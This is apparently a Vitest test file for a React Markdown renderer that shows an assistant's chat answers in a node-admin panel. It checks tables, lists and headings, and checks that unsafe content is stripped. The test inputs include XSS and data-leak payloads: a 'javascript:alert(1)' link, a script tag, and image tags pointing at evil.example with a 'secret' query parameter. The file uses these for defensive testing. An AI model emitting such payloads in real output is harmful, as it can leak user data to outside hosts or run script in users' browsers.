import { act, type ReactNode } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { ChatMarkdown, internalPath, parseChatMarkdown } from "./markdown";

vi.mock("@tanstack/react-router", () => ({
  Link: ({ children, to, className }: { children?: ReactNode; to: string; className?: string }) => (
    <a href={to} data-internal="1" className={className}>
      {children}
    </a>
  ),
}));

beforeAll(() => {
  (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
});

let root: Root | null = null;
let host: HTMLDivElement | null = null;
afterEach(() => {
  act(() => root?.unmount());
  host?.remove();
  root = host = null;
});

function render(text: string) {
  host = document.createElement("div");
  document.body.append(host);
  root = createRoot(host);
  act(() => root!.render(<ChatMarkdown text={text} />));
  return host;
}

describe("the assistant's Markdown", () => {
  it("renders what answers use: paragraphs, bold, code, lists and code blocks", () => {
    const el = render("**Two** nodes are down:\n\n1. `de1` since 10:02\n2. nl1\n\n- one\n- two\n\n```\nsystemctl status mistgate\n```");
    expect(el.querySelector("strong")?.textContent).toBe("Two");
    expect(el.querySelectorAll("ol li")).toHaveLength(2);
    expect(el.querySelectorAll("ul li")).toHaveLength(2);
    expect(el.querySelector("pre")?.textContent).toBe("systemctl status mistgate");
    expect(el.querySelector("code")?.textContent).toBe("de1");
  });

  it("links the admin's own pages in the app, keeps https links apart, and drops everything else", () => {
    const el = render("See [de1](/nodes/nod_1), [docs](https://mistgate.app/guide/), [bad](javascript:alert(1)), [plain](http://example.com) and [proto](//evil.example/x).");
    const internal = el.querySelector("a[data-internal]");
    expect(internal?.getAttribute("href")).toBe("/nodes/nod_1");
    const external = [...el.querySelectorAll("a:not([data-internal])")];
    expect(external.map((a) => a.getAttribute("href"))).toEqual(["https://mistgate.app/guide/"]);
    expect(external[0]?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(external[0]?.getAttribute("target")).toBe("_blank");
    expect(el.textContent).toContain("bad");
    expect(el.textContent).toContain("plain");
  });

  it("never renders HTML or images from the text", () => {
    const el = render('<img src="https://evil.example/x.png?d=secret"> ![leak](https://evil.example/p.png) <script>alert(1)</script>');
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("script")).toBeNull();
    expect(el.textContent).toContain("<img");
  });

  it("knows an admin path from anything that leaves the panel", () => {
    expect(internalPath("/users/usr_1?tab=devices")).toBe(true);
    expect(internalPath("//evil.example")).toBe(false);
    expect(internalPath("https://evil.example")).toBe(false);
    expect(internalPath("/a//b")).toBe(false);
  });

  it("joins the continuation lines of a list item", () => {
    const blocks = parseChatMarkdown("- first line\n  continues here\n- second");
    expect(blocks).toHaveLength(1);
    expect(blocks[0]).toMatchObject({ kind: "list", ordered: false });
  });

  // what a real answer sent and the chat showed as one run-on paragraph of pipes
  it("draws a table, with its alignment, and keeps a pipe inside code in its cell", () => {
    const el = render(
      "За последние 24 часа проблемы у **9 нод**:\n\n| Нода | Что произошло | Потери |\n|---|---|--:|\n| **tr** | Доступность из РФ: `blocked` | 0/150 |\n| ru2 | Порт `a|b` | 37/150 |\n\nde отдельных ошибок не имеет.",
    );
    const table = el.querySelector("table")!;
    expect(table).not.toBeNull();
    expect([...table.querySelectorAll("th")].map((th) => th.textContent)).toEqual(["Нода", "Что произошло", "Потери"]);
    const rows = [...table.querySelectorAll("tbody tr")].map((tr) => [...tr.querySelectorAll("td")].map((td) => td.textContent));
    expect(rows).toEqual([
      ["tr", "Доступность из РФ: blocked", "0/150"],
      ["ru2", "Порт a|b", "37/150"],
    ]);
    expect(table.querySelector("tbody td:last-child")?.className).toContain("text-end");
    expect(el.textContent).not.toContain("|---|");
    expect([...el.querySelectorAll("p")].map((p) => p.textContent)).toEqual(["За последние 24 часа проблемы у 9 нод:", "de отдельных ошибок не имеет."]);
  });

  it("nests an indented list, and knows headings, quotes and rules", () => {
    const el = render("## Коротко\n\n- tr\n  - blocked\n  - 0/150 to de\n- be\n\n> a quote\n\n---\n\n#### small");
    expect(el.querySelector("h3")?.textContent).toBe("Коротко");
    expect(el.querySelector("h5")?.textContent).toBe("small");
    const outer = el.querySelector("ul")!;
    expect(outer.children).toHaveLength(2);
    expect([...outer.querySelectorAll("li > ul > li")].map((li) => li.textContent)).toEqual(["blocked", "0/150 to de"]);
    expect(el.querySelector("blockquote")?.textContent).toBe("a quote");
    expect(el.querySelector("hr")).not.toBeNull();
  });

  it("leaves a line with a pipe but no separator row as text", () => {
    expect(parseChatMarkdown("a | b\nnot a table")).toEqual([expect.objectContaining({ kind: "paragraph" })]);
  });
});
